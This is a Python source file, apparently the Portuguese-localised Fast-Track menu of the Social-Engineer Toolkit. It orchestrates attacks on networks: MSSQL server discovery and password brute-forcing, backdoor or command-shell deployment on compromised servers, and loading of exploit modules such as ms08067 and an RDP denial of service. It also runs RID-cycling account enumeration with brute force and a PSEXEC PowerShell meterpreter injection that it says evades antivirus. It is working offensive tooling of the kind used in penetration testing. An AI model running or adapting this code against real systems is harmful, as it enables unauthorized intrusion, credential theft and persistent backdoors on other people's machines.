#!/usr/bin/env python
from src.core.setcore import *
from src.core.menu import text
import subprocess
from multiprocessing.dummy import Pool as ThreadPool 
definepath = os.getcwd()

try: input = raw_input
except: pass

#
#
# Fast-Track Main options and interface menus
#
#
try:
    while 1:
        #
        # USER INPUT: SHOW WEB ATTACK MENU         #
        #

        create_menu(text.fasttrack_text, text.fasttrack_menu)
        attack_vector = raw_input(setprompt(["19"], ""))

        if attack_vector == "99" or attack_vector == "desistir" or attack_vector == "sair":
            break

        #
        #
        # mssql_scanner
        #
        #
        if attack_vector == "1":
            # start the menu
            create_menu(text.fasttrack_mssql_text1, text.fasttrack_mssql_menu1)
            # take input here
            attack_vector_sql = raw_input(setprompt(["19", "21"], ""))

            #
            # option 1 scan and attack, option 2 connect directly to mssql
            # if 1, start scan and attack
            #
            if attack_vector_sql == '1':
                print(
                    "\nAqui você pode selecionar either um CIDR notation/IP Address ou um filename\nque contém uma lista de endereços IP.\n\nO formato de um arquivo seria semelhante a este:\n\n192.168.13.25\n192.168.13.26\n192.168.13.26\n\n1. Digitalizar endereço IP ou CIDR\n2. Importar arquivo que contém endereços IP do SQL Server\n")
                choice = raw_input(
                    setprompt(["19", "21", "22"], "Digite uma das opcões (ex. 1 or 2) [1]"))
                if choice != "1":
                    if choice != "2":
                        if choice != "":
                            print_error(
                                "Especifique 1 ou 2! Tente novamento.")
                            choice = raw_input(
                                setprompt(["19", "21", "22"], "Digite uma das opcões (ex. 1 or 2) [1]"))
                # grab ip address
                if choice == "":
                    choice = "1"
                if choice == "1":
                    range = raw_input(setprompt(
                        ["19", "21", "22"], "Insira o CIDR, IP único ou vários IPs separados por espaço (ex. 192.168.1.1/24)"))
                if choice == "2":
                    while 1:
                        range = raw_input(setprompt(
                            ["19", "21", "22"], "Digite o nome do ficheiro SQL servers (ex. /root/sql.txt - att não pdoe ser do tipo ipaddr:port)"))
                        if not os.path.isfile(range):
                            print_error(
                                "Arquivo não encontrado! Por favor, digite o caminho para o arquivo corretamente.")
                        else:
                            break
                if choice == "1":
                    port = "1433"
                if choice == "2":
                    port = "1433"
                # ask for a wordlist
                wordlist = raw_input(setprompt(
                    ["19", "21", "22"], "Insira o caminho para um arquivo de lista de palavras [use a lista de palavras padrão]"))
                if wordlist == "":
                    wordlist = "default"
                # specify the user to brute force
                username = raw_input(setprompt(
                    ["19", "21", "22"], "Digite o nome da força bruta ou o nome do ficheiro (/root/users.txt) [sa]"))
                # default to sa
                if username == "":
                    username = "sa"
                if username != "sa":
                    if not os.path.isfile(username):
                        print_status(
                            "Se você estava usando um arquivo, ele não foi encontrado, usando texto como nome de usuário.")
                # import the mssql module from fasttrack
                from src.fasttrack import mssql
                # choice from earlier if we want to use a filelist or whatnot
                if choice != "2":
                    # sql_servers
                    sql_servers = ''
                    print_status("Procurando servidores SQL. Isso pode demorar um pouco.")
                    if "/" or " " in str(range):
                        if "/" in str(range):
                            iprange = printCIDR(range)
                            iprange = iprange.split(",")
                            pool = ThreadPool(200)
                            sqlport = pool.map(get_sql_port, iprange)
                            pool.close()
                            pool.join()
                            for sql in sqlport:
                                if sql != None:
                                    if sql != "":
                                        sql_servers = sql_servers + sql + ","

                        else:
                            range1 = range.split(" ")
                            for ip in range1:
                                sqlport = get_sql_port(ip)
                                if sqlport != None:
                                    if sqlport != "":
                                        sql_servers = sql_servers + sqlport + ","

                    else:
                        # use udp discovery to get the SQL server UDP 1434
                        sqlport = get_sql_port(range)
                        # if its not closed then check nmap - if both fail then
                        # nada
                        if sqlport != None:
                            if sqlport != "":
                                sql_servers = sqlport + ","

                # specify choice 2
                if choice == "2":
                    if not os.path.isfile(range):
                        while 1:
                            print_warning(
                                "Desculpe chefe. O arquivo não foi encontrado. Tente novamente")
                            range = raw_input(setprompt(
                                ["19", "21", "22"], "Insira o CIDR, único, IP ou arquivo com endereços IP (ex. 192.168.1.1/24)"))
                            if os.path.isfile(range):
                                print_status(
                                    "Atta boy. Achei o arquivo dessa vez. Seguindo em frente.")
                                break

                    fileopen = open(range, "r").readlines()
                    sql_servers = ""
                    for line in fileopen:
                        line = line.rstrip()
                        sql_servers = sql_servers + line + ","

                # this will hold all of the SQL servers eventually
                master_list = ""
                # set a base counter
                counter = 0
                # if we specified a username list
                if os.path.isfile(username):
                    usernames = open(username, "r")

                if sql_servers != False:
                    # get rid of extra data from port scanner
                    sql_servers = sql_servers.replace(":%s OPEN" % (port), "")
                    # split into tuple for different IP address
                    sql_servers = sql_servers.split(",")
                    # start loop and brute force

                    print_status("A base de dados SQL foi identificado:\n")
                    for sql in sql_servers:
                        if sql != "":
                            print(sql)

                    if len(sql_servers) > 2:
                        print_status("Ao pressionar Enter, você iniciará o processo de força bruta em todas as contas SQL identificadas na lista acima.")
                        test = input("Pressione {enter} para iniciar o processo de força bruta.")
                    for servers in sql_servers:

                        # this will return the following format ipaddr + "," +
                        # username + "," + str(port) + "," + passwords
                        if servers != "":
                            # if we aren't using a username file
                            if not os.path.isfile(username):
                                sql_success = mssql.brute(
                                    servers, username, port, wordlist)
                                if sql_success != False:
                                # after each success or fail it will break
                                # into this to the above with a newline to
                                # be parsed later
                                    master_list = master_list + \
                                        sql_success + ":"
                                    counter = 1

                            # if we specified a username list
                            if os.path.isfile(username):
                                for users in usernames:
                                    users = users.rstrip()
                                    sql_success = mssql.brute(
                                        servers, users, port, wordlist)
                                    # we wont break out of the loop here incase
                                    # theres multiple usernames we want to find
                                    if sql_success != False:
                                        master_list = master_list + \
                                            sql_success + ":"
                                        counter = 1

                # if we didn't successful attack one
                if counter == 0:
                    if sql_servers:
                        print_warning(
                            "Desculpe. Não foi possível localizar ou comprometer totalmente um MSSQL Server nos seguintes servidores SQL: ")

                    else:
                        print_warning(
                            "Desculpe. Não foi possível encontrar nenhum servidor SQL para atacar.")
                    pause = raw_input(
                        "Pressione {return} para comtinuar o menu principal.")
                # if we successfully attacked one
                if counter == 1:
                    # need to loop to keep menu going
                    while 1:
                        # set a counter to show compromised servers
                        counter = 1
                        # here we list the servers we compromised
                        master_names = master_list.split(":")
                        print_status(
                            "O SET Fast-Track atacou os seguintes servidores SQL: ")
                        for line in sql_servers:
                            if line != "":
                                print("SQL Servidores: " + line.rstrip())
                        print_status(
                            "Abaixo estão os sistemas comprometidos com sucesso.\nSelecione o servidor SQL comprometido com o qual deseja interagir:\n")
                        for success in master_names:
                            if success != "":
                                success = success.rstrip()
                                success = success.split(",")
                                success = bcolors.BOLD + success[0] + bcolors.ENDC + "   username: " + bcolors.BOLD + "%s" % (success[1]) + bcolors.ENDC + " | password: " + bcolors.BOLD + "%s" % (success[
                                    3]) + bcolors.ENDC + "   SQLPort: " + bcolors.BOLD + "%s" % (success[2]) + bcolors.ENDC
                                print("   " + str(counter) + ". " + success)
                                # increment counter
                                counter = counter + 1

                        print("\n   99. Voltar para o menu principal.\n")
                        # select the server to interact with
                        select_server = raw_input(
                            setprompt(["19", "21", "22"], "Selecione um servidor SQL para injectar com [1]"))
                        # default 1
                        if select_server == "desistir" or select_server == "sair":
                            break
                        if select_server == "":
                            select_server = "1"
                        if select_server == "99":
                            break
                        counter = 1
                        for success in master_names:
                            if success != "":
                                success = success.rstrip()
                                success = success.split(",")
                                # if we equal the number used above
                                if counter == int(select_server):
                                # ipaddr + "," + username + "," + str(port) +
                                # "," + passwords
                                    print(
                                        "\nComo você deseja implantar o binário via depuração (win2k, winxp, win2003) e/ou powershell (vista, win7, 2008, 2012) ou apenas um shell\n\n 1. Implantar Backdoor no Sistema\n 2. Shell Padrão do Windows\n\n 99. Retorne ao menu principal.\n")
                                    option = raw_input(
                                        setprompt(["19", "21", "22"], "Qual opção de implantação você deseja [1]"))
                                    if option == "":
                                        option = "1"
                                    # if 99 then break
                                    if option == "99":
                                        break
                                    # specify we are using the fasttrack
                                    # option, this disables some features
                                    filewrite = open(
                                        userconfigpath + "fasttrack.options", "w")
                                    filewrite.write("none")
                                    filewrite.close()
                                    # import fasttrack
                                    if option == "1":
                                        # import payloads for selection and
                                        # prep
                                        mssql.deploy_hex2binary(
                                            success[0], success[2], success[1], success[3])
                                    # straight up connect
                                    if option == "2":
                                        mssql.cmdshell(success[0], success[2], success[
                                                       1], success[3], option)
                                # increment counter
                                counter = counter + 1

            #
            # if we want to connect directly to a SQL server
            #
            if attack_vector_sql == "2":
                sql_server = raw_input(setprompt(
                    ["19", "21", "23"], "Digite o hostname ou IP do  SQL server"))
                sql_port = raw_input(
                    setprompt(["19", "21", "23"], "Digite a SQL porta para conectar [1433]"))
                if sql_port == "":
                    sql_port = "1433"
                sql_username = raw_input(
                    setprompt(["19", "21", "23"], "Digite o nome da  SQL Server [sa]"))
                # default to sa
                if sql_username == "":
                    sql_username = "sa"
                sql_password = raw_input(
                    setprompt(["19", "21", "23"], "Digite a passeword para a SQL server"))
                print_status("Conectando a SQL server...")
                # try connecting
                # establish base counter for connection
                counter = 0
                try:
                    import _mssql
                    conn = _mssql.connect(
                        sql_server + ":" + str(sql_port), sql_username, sql_password)
                    counter = 1
                except Exception as e:
                    print(e)
                    print_error("Conexão com a SQL falhou. Tente novamente.")
                # if we had a successful connection
                if counter == 1:
                    print_status(
                        "Entrando em um shell SQL. Digite quit para sair.")
                    # loop forever
                    while 1:
                        # enter the sql command
                        sql_shell = raw_input("Digite seu coamndo SQL aqui: ")
                        if sql_shell == "desistir" or sql_shell == "sair":
                            print_status(
                                "Saindo do shell SQL e retornando ao menu.")
                            break

                        try:
                            # execute the query
                            sql_query = conn.execute_query(sql_shell)
                            # return results
                            print("\n")
                            for data in conn:
                                data = str(data)
                                data = data.replace("\\n\\t", "\n")
                                data = data.replace("\\n", "\n")
                                data = data.replace("{0: '", "")
                                data = data.replace("'}", "")
                                print(data)
                        except Exception as e:
                            print_warning(
                                "\nSintaxe incorreta em algum lugar. Imprimindo mensagem de erro:: " + str(e))

        #
        #
        # exploits menu
        #
        #
        if attack_vector == "2":
            # start the menu
            create_menu(text.fasttrack_exploits_text1,
                        text.fasttrack_exploits_menu1)
            # enter the exploits menu here
            range = raw_input(
                setprompt(["19", "24"], "Selecione o número de exploit que você deseja: "))

            # ms08067
            if range == "1":
                try:
                    module_reload(src.fasttrack.exploits.ms08067)
                except:
                    import src.fasttrack.exploits.ms08067

            # firefox 3.6.16
            if range == "2":
                try:
                    module_reload(src.fasttrack.exploits.firefox_3_6_16)
                except:
                    import src.fasttrack.exploits.firefox_3_6_16
            # solarwinds
            if range == "3":
                try:
                    module_reload(src.fasttrack.exploits.solarwinds)
                except:
                    import src.fasttrack.exploits.solarwinds

            # rdp DoS
            if range == "4":
                try:
                    module_reload(src.fasttrack.exploits.rdpdos)
                except:
                    import src.fasttrack.exploits.rdpdos

            if range == "5":
                try:
                    module_reload(src.fasttrack.exploits.mysql_bypass)
                except:
                    import src.fasttrack.exploits.mysql_bypass

            if range == "6":
                try:
                    module_reload(src.fasttrack.exploits.f5)
                except:
                    import src.fasttrack.exploits.f5

        #
        #
        # sccm attack menu
        #
        #
        if attack_vector == "3":
            # load sccm attack
            try:
                module_reload(src.fasttrack.sccm.sccm_main)
            except:
                import src.fasttrack.sccm.sccm_main

        #
        #
        # dell drac default credential checker
        #
        #
        if attack_vector == "4":
            # load drac menu
            subprocess.Popen("python %s/src/fasttrack/delldrac.py" %
                             (definepath), shell=True).wait()

        #
        #
        # RID ENUM USER ENUMERATION
        #
        #
        if attack_vector == "5":
            print (""".______       __   _______         _______ .__   __.  __    __  .___  ___.
|   _  \     |  | |       \       |   ____||  \ |  | |  |  |  | |   \/   |
|  |_)  |    |  | |  .--.  |      |  |__   |   \|  | |  |  |  | |  \  /  |
|      /     |  | |  |  |  |      |   __|  |  . `  | |  |  |  | |  |\/|  |
|  |\  \----.|  | |  '--'  |      |  |____ |  |\   | |  `--'  | |  |  |  |
| _| `._____||__| |_______/  _____|_______||__| \__|  \______/  |__|  |__|
                |______|
""")
            print(
                "\nRID_ENUM é uma ferramenta que enumerará contas de usuários por meio de um ataque de ciclo de rid por meio de sessões nulas. Para que isso funcione, o servidor remoto precisará ter sessões nulas habilitadas. Na maioria dos casos, você usaria isso contra um controlador de domínio em um teste de penetração interno. Você não precisa fornecer credenciais, ele tentará enumerar o endereço RID base e, em seguida, percorrer 500 (Administrador) para qualquer RID que você desejar.")
            print("\n")
            ipaddr = raw_input(
                setprompt(["31"], "Digite o Endereço IP do servidor (ou sair para cancelar)"))
            if ipaddr == "99" or ipaddr == "desistir" or ipaddr == "sair":
                break
            print_status(
                "Em seguida, você pode forçar brutamente as contas de usuário automaticamente. Se você não quiser forçar brutamente, digite no no próximo prompt")
            dict = raw_input(setprompt(
                ["31"], "Digite o caminho para o arquivo do dicionário para força bruta [digite para embutido]"))
            # if we are using the built in one
            if dict == "":
                # write out a file
                filewrite = open(userconfigpath + "dictionary.txt", "w")
                filewrite.write("\nPassword1\nPassword!\nlc username")
                # specify the path
                dict = userconfigpath + "dictionary.txt"
                filewrite.close()

            # if we are not brute forcing
            if dict.lower() == "no":
                print_status("Sem problema, Nenhuma conta encontrada")
                dict = ""

            if dict != "":
                print_warning(
                    "Você está prestes a forçar contas de usuários, tome cuidado com bloqueios")
                choice = raw_input(
                    setprompt(["31"], "Você tem certeza que quer força bruta [sim/não]"))
                if choice.lower() == "n" or choice.lower() == "não":
                    print_status(
                        "Okay. Nenhuma força bruta será usada *phew*.")
                    dict = ""

            # next we see what rid we want to start
            start_rid = raw_input(
                setprompt(["31"], "Em qual RID você quer começar? [500]"))
            if start_rid == "":
                start_rid = "500"
            # stop rid
            stop_rid = raw_input(
                setprompt(["31"], "Em qual RID você quer parar? [15000]"))
            if stop_rid == "":
                stop_rid = "15000"
            print_status(
                "Iniciando RID_ENUM para começar enumerating contas de usuários...")
            subprocess.Popen("python src/fasttrack/ridenum.py %s %s %s %s" %
                             (ipaddr, start_rid, stop_rid, dict), shell=True).wait()

            # once we are finished, prompt.
            print_status("Está tudo finalizado!")
            pause = raw_input("Pressione {return} para voltar ao menu principal.")

        #
        #
        # PSEXEC PowerShell
        #
        #
        if attack_vector == "6":
            print(
                "\nPSEXEC Ataque de injeção do Powershell:\n\nEste ataque injetará um backdoor do meterpreter por meio da injeção de memória do Powershell. Isso contornará\nAntivírus, pois nunca tocaremos no disco. Exigirá que o Powershell seja instalado na máquina da vítima remota.\nVocê pode usar senhas diretas ou valores de hash.\n")
            try:
                module_reload(src.fasttrack.psexec)
            except:
                import src.fasttrack.psexec

# handle keyboard exceptions
except KeyboardInterrupt:
    pass
